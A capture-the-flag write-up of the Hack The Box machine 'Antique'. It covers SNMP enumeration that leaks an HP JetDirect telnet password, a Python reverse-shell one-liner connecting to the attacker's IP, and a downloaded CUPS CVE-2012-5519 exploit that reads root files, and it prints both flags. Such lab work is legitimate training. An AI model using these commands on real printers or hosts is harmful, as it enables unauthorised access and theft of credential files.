---
title: "Antique from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Antique from HTB
`nmap`gave this
```bash
nmap -sC --min-rate=4000 -T4 10.10.11.107 -Pn

PORT   STATE SERVICE
23/tcp open  telnet
-------------------------------------------------------
sudo nmap -sU --min-rate=4000 -T4 10.10.11.107 -Pn

PORT      STATE  SERVICE
161/udp   open   snmp
-------------------------------------------------------
 sudo nmap -sU -sV --min-rate=4000 -T4 10.10.11.107 -p 161

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
```
the `(public)`means that we can use `snmpwalk`on it
```bash
snmpwalk -v 1 -c public 10.10.11.107
iso.3.6.1.2.1 = STRING: "HTB Printer"
```
I got nothing more from `snmpwalk`
```bash
telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: admin
Invalid password
Connection closed by foreign host.
```
Searching `HP JedDirect`got me something
https://www.irongeek.com/i.php?page=security/networkprinterhacking
Here is an exploit with `snmpget`which we can use and it will give us `hexed passowrd`
```bash
snmpget -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```
This is `hex`and decode it to get password. Go to `CyberChef`and use `From Hex`
```
P@ssw0rd@123!!123
```
We got The password, go to `telnet`and connect with this password: `P@ssw0rd@123!!123`
```bash
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```
the `exec`can execute normal commands so let's try to get shell with python.
https://www.revshells.com/
use `python`ones
this got me connection
```python
exec python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.7",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```
***
User Flag is: 577f8cdadeb1458074f296c3de434610
***
```bash
ss -tlnp

LISTEN    0         4096             127.0.0.1:631              0.0.0.0:*
```
lets see what is on `631`port with `curl`
```bash
curl 127.0.0.1:631


<H1>CUPS 1.6.1</H1>
```
We can find exploit for this on `github` https://github.com/p1ckzi/CVE-2012-5519/blob/main/cups-root-file-read.sh
which if we download on `remote machine` and execute we can read `root flag or /etc/shadow`
```bash
wget 10.10.16.7:8001/ragaca.sh
chmod +x ragaca.sh
echo '/root/root.txt' | ./cups-root-file-read.sh
```
***
Root Flag is: 4985b7a44209c17f0eda5d61862a966c
***
![](/assets/images/2024-08-23_18-36-57.png)
